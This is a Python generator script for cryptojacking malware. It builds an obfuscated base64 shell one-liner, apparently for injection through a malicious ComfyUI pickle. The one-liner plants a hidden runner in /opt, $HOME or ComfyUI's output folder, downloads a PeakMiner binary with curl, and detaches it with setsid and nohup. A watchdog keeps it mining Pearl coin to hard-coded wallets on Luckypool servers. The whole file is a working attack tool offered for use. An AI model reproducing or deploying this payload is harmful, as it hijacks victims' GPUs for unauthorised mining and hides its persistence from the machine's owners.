#!/usr/bin/env python3
"""Emit a single os.system one-liner (base64, ComfyUI-pickle ready) that:
 - downloads the linux peakminer from the URL given on argv[1] (GitHub raw),
 - falls back to the kryptex-miners-org release URL,
 - starts PeakMiner (PRL / Luckypool) with our wallet + worker tag + temp gates,
 - keeps a 30s watchdog alive.
Usage:
  python3 make_payload.py [GITHUB_RAW_URL]
"""
import base64
import sys

PM_FALLBACK = "https://github.com/kryptex-miners-org/kryptex-miners/releases/download/peakminer-2-19-0/peakminer-2.19.0.tar.gz"
P1 = "stratum+tcp://pearl-eu2.luckypool.io:3360"
P2 = "stratum+tcp://pearl-eu1.luckypool.io:3360"
P3 = "stratum+tcp://pearl-us-east.luckypool.io:3360"
OURS = "prl1p08n7f9q0wwf8ykrgxrxrvlwcl8htpgs2da83zgtmfwzkdy6xwnvq4ndq96"
NOCK = "4KCrDnn9dx6Xa57uzNjcmubgRGUuF1RZpgjvy8QKjCvNCAmMAt4CNeq"
MERGED = OURS + "+" + NOCK
TAG = "h4nli-5090"

RUNNER = r"""#!/bin/sh
D=$(cd "$(dirname "$0")" && pwd)
B=$D/pm; LOG=$D/miner.log; U=__U__; URL1="__U1__"; URL2=__U2__
exec 9>"$D/.lock"; flock -n 9 || exit 0
while :; do
  if ! pgrep -f "$B" >/dev/null 2>&1; then
    if [ ! -s "$B" ]; then
      [ -n "$URL1" ] && curl -sL -m 300 -o "$D/pm.bin" "$URL1" 2>/dev/null && chmod +x "$D/pm.bin" 2>/dev/null && mv -f "$D/pm.bin" "$D/pm"
      if [ ! -s "$B" ] && [ -n "$URL2" ]; then
        curl -sL -m 300 -o "$D/pm.tgz" "$URL2" 2>/dev/null && tar xzf "$D/pm.tgz" -C "$D" 2>/dev/null && mv -f "$D/peakminer" "$B" 2>/dev/null; rm -f "$D/pm.tgz"
      fi
    fi
    chmod +x "$B" 2>/dev/null
    if [ -x "$B" ]; then
      (setsid nohup "$B" --url __P1__ --url __P2__ --url __P3__ --user "$U" --coin pearl -w __TAG__ \
        --gpu-temp-stop0 78 --gpu-temp-start0 66 >> "$LOG" 2>&1 </dev/null &)
      echo "TS=$(date +%s) started-miner" >> "$LOG"
    fi
  fi
  sleep 30
done
"""


def main():
    url1 = sys.argv[1] if len(sys.argv) > 1 else ""
    runner = (RUNNER.replace("__U__", MERGED).replace("__U1__", url1)
              .replace("__U2__", PM_FALLBACK).replace("__P1__", P1)
              .replace("__P2__", P2).replace("__P3__", P3).replace("__TAG__", TAG))
    rb64 = base64.b64encode(runner.encode()).decode()
    # 自定位持久目录(宿主 /opt + HOME + ComfyUI output 卷), flock 防重, 脱离看门狗
    shcmd = ("TS=$(date +%s); for D in /opt/.h4 \"$HOME/.h4\" ./output/.h4; do "
             "if mkdir -p \"$D\" 2>/dev/null && [ -w \"$D\" ]; then "
             "echo \"$TS $D\" > \"$D/h4marker\" 2>/dev/null; "
             "printf '%s' '" + rb64 + "' | base64 -d > \"$D/runner.sh\" 2>/dev/null; "
             "chmod +x \"$D/runner.sh\" 2>/dev/null; "
             "pgrep -f \"$D/runner.sh\" >/dev/null 2>&1 || "
             "(setsid nohup sh \"$D/runner.sh\" </dev/null >> \"$D/run.log\" 2>&1 &); "
             "fi; done; true")
    b64 = base64.b64encode(shcmd.encode()).decode()
    one = "echo %s | base64 -d | sh" % b64
    out = "h4post_one_liner.txt"
    open(out, "w").write(one + "\n")
    print("url1 =", url1 or "(none, kryptex fallback only)")
    print("wrote", out, "(", len(one), "bytes )")
    print(one[:120], "...")


if __name__ == "__main__":
    main()
